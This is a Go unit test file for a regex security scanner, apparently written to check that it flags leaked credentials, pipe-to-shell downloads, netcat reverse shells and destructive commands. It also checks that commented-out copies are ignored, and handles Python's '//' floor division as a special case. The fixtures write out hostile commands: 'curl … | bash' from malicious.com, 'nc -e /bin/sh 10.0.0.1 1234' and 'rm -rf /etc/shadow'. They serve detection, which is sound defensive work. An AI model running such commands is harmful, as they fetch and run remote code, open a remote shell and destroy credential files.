package security

import (
	"testing"
)

func TestRegexScanner_Scan(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		content     string
		wantFinding string
	}{
		{
			name:        "Safe Content",
			content:     "fmt.Println(\"Hello World\")",
			wantFinding: "",
		},
		{
			name:        "AWS Key",
			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
			wantFinding: "AWS Access Key",
		},
		{
			name:        "GitHub Token",
			content:     "token = \"ghp_123456789012345678901234567890123456\"",
			wantFinding: "GitHub Token",
		},
		{
			name:        "Private Key",
			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
			wantFinding: "Private Key",
		},
		{
			name:        "Generic API Key",
			content:     "api_key = \"abc1234567890abc1234567890\"",
			wantFinding: "Generic API Token",
		},
		{
			name:        "Curl Pipe Bash",
			content:     "curl https://malicious.com/install.sh | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Wget Pipe Sh",
			content:     "wget -O - https://malicious.com/install.sh | sh",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Netcat Reverse Shell",
			content:     "nc -e /bin/sh 10.0.0.1 1234",
			wantFinding: "Reverse Shell",
		},
		{
			name:        "Commented Pipe to Shell",
			content:     "// curl https://malicious.com/install.sh | bash",
			wantFinding: "",
		},
		{
			name:        "Shell Commented Pipe to Shell",
			content:     "# curl https://malicious.com/install.sh | bash",
			wantFinding: "",
		},
		{
			name:        "String Pipe to Shell",
			content:     "fmt.Println(\"Don't run curl | bash\")",
			wantFinding: "",
		},
		{
			name:        "Commented Dangerous Command",
			content:     "// rm -rf /etc/shadow",
			wantFinding: "",
		},
	}

	// Additional language-specific tests
	t.Run("Python Floor Division", func(t *testing.T) {
		content := "x = 1 // 2; system('rm -rf /etc/shadow')"
		findings, err := scanner.Scan("script.py", content)
		if err != nil {
			t.Fatalf("Scan failed: %v", err)
		}
		// Should match Dangerous Command because // is NOT a comment in Python
		found := false
		for _, f := range findings {
			if f.Type == "Dangerous Command" {
				found = true
				break
			}
		}
		if !found {
			t.Error("Expected Dangerous Command finding in Python file, but got none (// was likely masked as comment)")
		}
	})

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Default to .go for tests unless specified in name?
			// Actually, let's use .go for all existing tests as they use // comments.
			filename := "test.go"

			findings, err := scanner.Scan(filename, tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			} else {
				if len(findings) == 0 {
					t.Errorf("Expected finding %q, got none", tt.wantFinding)
				} else {
					found := false
					for _, f := range findings {
						if f.Type == tt.wantFinding {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
					}
				}
			}
		})
	}
}
